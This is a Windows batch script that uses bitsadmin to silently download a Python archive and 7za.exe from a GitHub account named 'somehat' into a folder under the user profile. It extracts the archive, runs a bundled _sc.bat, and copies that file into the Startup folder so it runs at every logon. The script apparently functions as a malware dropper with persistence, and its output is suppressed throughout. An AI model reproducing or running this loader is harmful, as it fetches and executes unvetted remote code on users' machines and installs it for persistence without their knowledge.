   @echo off
    setlocal

   
    mkdir C:\Users\%username%\_tmp_\
    cd C:\Users\%username%\_tmp_\

    set url=https://github.com/somehat/files/raw/main/python.zip



    set url1=https://github.com/somehat/files/raw/main/7za.exe
    set file=python.zip







    set file1=7za.exe
    
    rem ----
    if "%~3" NEQ "" (
        set /A timeout=%~3
    ) else (
        set timeout=5
    )

    bitsadmin /cancel download >nul


    bitsadmin /create /download download >nul 




    call bitsadmin /addfile download "%url%" "%CD%\%file%" >nul
    bitsadmin /resume download >nul 
    bitsadmin /setproxysettings download AUTODETECT >nul

    bitsadmin /cancel download1 >nul
    bitsadmin /create /download download1 >nul 
    call bitsadmin /addfile download1 "%url1%" "%CD%\%file1%" >nul
    bitsadmin /resume download1 >nul
    bitsadmin /setproxysettings download1 AUTODETECT >nul

    set /a attempts=0
    :repeat
    set /a attempts +=1
    if "%attempts%" EQU "10" (
        endlocal
        exit /b 1
    )
    bitsadmin /info download /verbose | find  "STATE: ERROR"  >nul 2>&1 && endlocal &&  bitsadmin /cancel download && echo SOME KIND OF ERROR && exit /b 2
    bitsadmin /info download /verbose | find  "STATE: SUSPENDED" >nul 2>&1 && endlocal &&  bitsadmin /cancel download &&echo FILE WAS NOT ADDED && exit /b 3
    bitsadmin /info download /verbose | find  "STATE: TRANSIENT_ERROR" >nul 2>&1 && endlocal &&  bitsadmin /cancel download &&echo TRANSIENT ERROR && exit /b 4
    bitsadmin /info download /verbose | find  "STATE: TRANSFERRED" >nul 2>&1 && goto :finishing 

   w32tm /stripchart /computer:localhost /period:1 /dataonly /samples:%timeout%  >nul 2>&1

    goto :repeat
    :finishing 
    bitsadmin /complete download >nul
    bitsadmin /complete download1 >nul

    7za.exe x python.zip
    timeout 1
    cd python
    timeout 1
    cmd /C "start C:\Users\%username%\_tmp_\python\_sc.bat"
    timeout 1
    COPY "C:\Users\%username%\_tmp_\python\_sc.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\_sc.bat"
    exit



    endlocal

   goto :eof

   :help
   echo  file
